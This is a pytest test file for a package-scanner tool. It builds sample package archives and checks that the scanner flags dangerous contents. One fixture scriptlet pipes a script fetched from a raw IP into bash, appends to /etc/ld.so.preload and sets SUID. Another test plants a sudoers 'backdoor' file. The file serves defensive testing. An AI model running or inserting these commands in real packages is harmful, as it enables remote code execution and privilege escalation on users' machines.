import tarfile
import pytest
from sentinel import pkgscan


def build_pkg(path, install=None, files=None):
    """files: list of (arcname, mode). install: .INSTALL script text."""
    with tarfile.open(path, "w:gz") as tar:
        if install is not None:
            data = install.encode()
            ti = tarfile.TarInfo(".INSTALL")
            ti.size = len(data)
            import io
            tar.addfile(ti, io.BytesIO(data))
        for arcname, mode in (files or []):
            ti = tarfile.TarInfo(arcname)
            ti.mode = mode
            ti.size = 0
            if arcname.endswith("/"):
                ti.type = tarfile.DIRTYPE
            tar.addfile(ti, None if ti.size == 0 and ti.type != tarfile.REGTYPE else None)
    return path


def levels(findings):
    return {lvl for lvl, _ in findings}


def msgs(findings):
    return " | ".join(m for _, m in findings)


def test_clean_package(tmp_path):
    pkg = build_pkg(tmp_path / "ok-1-1-x86_64.pkg.tar.gz",
                    install="post_install() { echo hi; }",
                    files=[("usr/bin/tool", 0o755)])
    name, findings = pkgscan.scan_file(pkg)
    assert name == "ok"
    assert findings == []


def test_malicious_scriptlet(tmp_path):
    script = ("post_install() {\n"
              "  curl -s http://185.220.101.5/x.sh | bash\n"
              "  echo x >> /etc/ld.so.preload\n"
              "  chmod u+s /usr/bin/thing\n"
              "}\n")
    pkg = build_pkg(tmp_path / "evil-1-1-x86_64.pkg.tar.gz", install=script,
                    files=[("usr/bin/thing", 0o755)])
    _, findings = pkgscan.scan_file(pkg)
    assert pkgscan.HIGH in levels(findings)
    joined = msgs(findings).lower()
    assert "downloads and runs" in joined
    assert "ld.so.preload" in joined
    assert "suid" in joined


def test_suid_and_sensitive_file(tmp_path):
    pkg = build_pkg(tmp_path / "s-1-1-x86_64.pkg.tar.gz", install="",
                    files=[("usr/bin/sneaky", 0o4755),
                           ("etc/sudoers.d/", 0o755),
                           ("etc/sudoers.d/backdoor", 0o644)])
    _, findings = pkgscan.scan_file(pkg)
    joined = msgs(findings)
    assert "SUID/SGID program: /usr/bin/sneaky" in joined
    assert "sudoers" in joined.lower()
    # the directory entry itself is not reported, only the file in it
    assert "/etc/sudoers.d/\n" not in joined
    assert sum("sudoers" in m.lower() for _, m in findings) == 1


@pytest.mark.parametrize("perms,expected", [
    ("-rwsr-xr-x", True),
    ("-rwxr-sr-x", True),
    ("-rwxr-xr-x", False),
    ("drwxr-xr-x", False),
])
def test_is_setuid(perms, expected):
    assert pkgscan.is_setuid(perms) == expected
